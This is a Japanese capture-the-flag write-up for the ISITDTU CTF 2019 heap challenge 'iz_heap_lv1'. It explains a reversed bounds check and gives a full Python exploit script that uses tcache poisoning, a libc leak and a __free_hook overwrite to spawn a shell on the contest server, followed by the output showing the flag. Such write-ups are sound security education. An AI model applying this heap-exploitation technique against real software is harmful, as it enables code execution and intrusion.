# [pwn 395pts] iz_heap_lv1 - ISITDTU CTF 2019
64ビットでPIE以外有効です。
```
$ checksec -f iz_heap_lv1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		2	iz_heap_lv1
```
ヒープ系問題です。
最初にnameを入力し、その後サイズを指定してadd, edit, delete, show nameができます。editでは一度freeされてもう一度新しいサイズでmallocされます。show nameではグローバル変数のnameを表示しますが、これを変更することもできます。addでmallocしたデータは表示できないので、何らかの形でnameにlibcアドレスを書き込む必要がありそうです。
さて、deleteやeditを見ても一見脆弱性はなさそうですが、よくアセンブリを見るとサイズチェックやインデックスチェックの大なりと小なりが逆になっていることが分かります。したがって、任意のサイズで確保でき、任意のインデックスにあるポインタをfreeできます。addされたデータへのポインタはbssセクションにある配列に書き込まれているのですが、そのすぐ後にnameがあります。したがって、nameに偽のポインタを入れればdeleteでfreeできます。
まずnameにnameの少し先を指すポインタを入れます。そして、その先に偽のチャンクを置いておけばdeleteでfreeしたときにそこの(nameの少し先の)アドレスがtcacheに入ります。
```
tcache --> name+delta --> ...
```
これでヒープのアドレスをリークできますが、それより重要なのは今回はnameが変更できるということです。したがって、freeされた場所に書き込めるので実質UAFがあります。よく考えればここでtcacheのポインタをGOTに向ければ簡単なのですが、なぜか今回は偽の巨大なチャンクを作ってunsorted binからアドレスをリークするというやや遠回りな方法を取っています。
libcのアドレスが分かれば同じ原理で`__free_hook`を書き換えるだけです。

```python
from ptrlib import *

def add(size, data):
    sock.sendlineafter("Choice: \n", "1")
    sock.sendlineafter("size: ", str(size))
    sock.sendafter("data: ", data)

def edit(index, size, data):
    sock.sendlineafter("Choice: \n", "2")
    sock.sendlineafter("index: ", str(index))
    sock.sendlineafter("size: ", str(size))
    sock.sendafter("data: ", data)

def delete(index):
    sock.sendlineafter("Choice: \n", "3")
    sock.sendlineafter("index: ", str(index))

def show_name(name=None):
    sock.sendlineafter("Choice: \n", "4")
    if name is None:
        sock.sendlineafter("(Y/N)", "N")
    else:
        sock.sendlineafter("(Y/N)", "Y")
        sock.sendafter("name: ", name)
    sock.recvuntil("Name: ")
    return sock.recvline()

libc = ELF("./libc.so.6")
#sock = Process("./iz_heap_lv1")
sock = Socket("165.22.110.249", 3333)
addr_list = 0x602060
addr_name = 0x602100
libc_main_arena = 0x3ebc40
delta = 0x60

# create fake chunk
fake_list  = p64(addr_name + 0x20) + p64(0) # 20, 21
fake_chunk = p64(0) + p64(0x31)
sock.sendlineafter("name: ", fake_list + fake_chunk)

# free fake chunk
add(0x20, "AAA") # 0
delete(0)
delete(20)
addr_heap = u64(show_name("A" * 0x20)[0x20:]) + 0x30
logger.info("addr heap = " + hex(addr_heap))

# double free for creating fake chunk
add(0x30, "AAA") # 0: addr_heap
add(0x40, "AAA") # 1: addr_heap + 0x40
add(0x50, "AAA") # 2: addr_heap + 0x90
add(0x60, "/bin/sh\x00") # 3
show_name(p64(addr_heap))
delete(0)
delete(20)
add(0x30, p64(addr_name + 0x20 + 0xa00)) # 0
add(0x30, p64(addr_heap)) # 4: dummy
add(0x30, p64(0) + p64(0x21)) # 5
fake_list  = p64(addr_heap + 0x40) + p64(addr_name + 0x20) # 20, 21
fake_chunk = p64(0) + p64(0xa11)
show_name(fake_list + fake_chunk)
delete(1)
delete(20)
add(0x40, p64(addr_name + 0x20 + 0xa00 + 0x20)) # 1
add(0x40, p64(addr_heap)) # 6: dummy
add(0x40, p64(0) + p64(0x21)) # 7

# libc leak
delete(21)
libc_base = u64(show_name("A" * 0x20)[0x20:]) - libc_main_arena - delta
logger.info("libc base = " + hex(libc_base))

# double free for overwriting __free_hook
show_name(p64(addr_heap + 0x90))
delete(2)
delete(20)
add(0x50, p64(libc_base + libc.symbol("__free_hook"))) # 2
add(0x50, "dummy") # 8
add(0x50, p64(libc_base + libc.symbol("system"))) # 9

# get the shell!
delete(3)

sock.interactive()
```

よきかな。
```
$ python solve.py 
[+] __init__: Successfully connected to 165.22.110.249:3333
[+] <module>: addr heap = 0x82a290
[+] <module>: libc base = 0x7f98498e8000
[ptrlib]$ cat /home/iz_heap_lv1/flag
ISITDTU{d800dab9684113a5d6c7d2c0381b48c1553068bc}[ptrlib]$
```

# 感想
半年前なら確実に解けなかったと考えると成長を実感できます。
